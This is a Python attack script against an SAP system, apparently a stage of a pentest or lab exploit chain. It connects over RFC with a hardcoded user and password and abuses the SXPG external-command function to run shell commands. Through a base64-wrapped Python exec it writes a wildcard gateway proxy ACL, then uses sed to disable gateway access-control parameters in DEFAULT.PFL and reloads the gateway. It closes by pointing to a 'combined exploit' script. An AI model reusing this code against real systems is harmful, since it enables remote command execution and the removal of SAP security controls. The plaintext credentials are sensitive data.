#!/usr/bin/env python3
"""Write prxyinfo to correct path (/D00/data/), patch DEFAULT.PFL, reload GW."""
import sys, time, base64
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
BASE = dict(TARGET='', DESTINATION='', STDINCNTL='R', STDOUTCNTL='M',
            STDERRCNTL='M', TRACECNTL='0', TERMCNTL='C', TRACELEVEL='0',
            LONG_PARAMS='', CONNCNTL='H')

def sxpg(conn, prog, params, label=''):
    if label: print(f"\n[CMD] {label}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try: r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else: print(f'  ERROR: {e}'); return
    except Exception as e:
        print(f'  ERROR: {e}'); return
    for row in r.get('LOG', []):
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '') if isinstance(row, dict) else str(row)
        if line.rstrip(): print(f'  {line.rstrip()}')

def py_exec(conn, code: str, label: str = ''):
    """Run Python code via base64-encoded exec. Code must be < ~130 bytes when b64-encoded."""
    b64 = base64.b64encode(code.encode()).decode()
    params = f"-c exec(__import__('base64').b64decode('{b64}').decode())"
    if len(params) > 250:
        print(f"  [WARN] params len={len(params)}, may be truncated")
    sxpg(conn, '/usr/bin/python3', params, label)

with RFCConnection(sdk_path=SDK, ashost='192.168.2.209', sysnr='00',
                   client='001', user='joris', passwd='SccAdmin123!', lang='EN') as conn:
    print('[+] RFC connected\n')

    # Step 1: Check /D00/data/ exists, create it if not
    sxpg(conn, '/bin/ls', '-la /usr/sap/S4H/D00/',
         'List D00 dir')

    sxpg(conn, '/bin/ls', '-la /usr/sap/S4H/D00/data/',
         'Check D00/data/ dir')

    # Create D00/data if not exists (mkdir -p)
    sxpg(conn, '/bin/mkdir', '-p /usr/sap/S4H/D00/data',
         'Create D00/data dir')

    # Step 2: Write permissive prxyinfo to correct path
    py_exec(conn,
            "open('/usr/sap/S4H/D00/data/prxyinfo','w').write('#VERSION=2\\nP SOURCE=* DEST=*\\n')",
            'Write prxyinfo to /D00/data/prxyinfo')

    sxpg(conn, '/usr/bin/cat', '/usr/sap/S4H/D00/data/prxyinfo',
         'Verify prxyinfo content')

    # Step 3: Patch DEFAULT.PFL using sed with | delimiter (avoids / escaping issues)
    # SAP single-quotes the expr as one token: ["-i", "s|...|...|", "/path"]
    sxpg(conn, '/usr/bin/sed',
         "-i 's|gw/reg_no_conn_info = 255|gw/reg_no_conn_info = 1|' /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
         'Patch DEFAULT.PFL: reg_no_conn_info 255->1')

    sxpg(conn, '/usr/bin/sed',
         "-i 's|gw/acl_mode_proxy = 1|gw/acl_mode_proxy = 0|' /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
         'Patch DEFAULT.PFL: acl_mode_proxy 1->0')

    # Verify patch
    sxpg(conn, '/usr/bin/grep', 'gw/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL',
         'DEFAULT.PFL GW params after patch')

    # Step 4: Find current GW PID and send SIGHUP to reload
    # Use pkill -f gwrd (sends to all gwrd processes)
    print("\n[*] Sending SIGHUP to gwrd to reload config...")
    sxpg(conn, '/usr/bin/pkill', '-HUP -f gwrd',
         'SIGHUP to gwrd (reload)')

    # If that killed the connection, we'll need to reconnect
    print("[*] Sent reload signal. GW will restart and pick up new config.")
    print("[*] Wait ~10s then run test_combined_exploit.py")
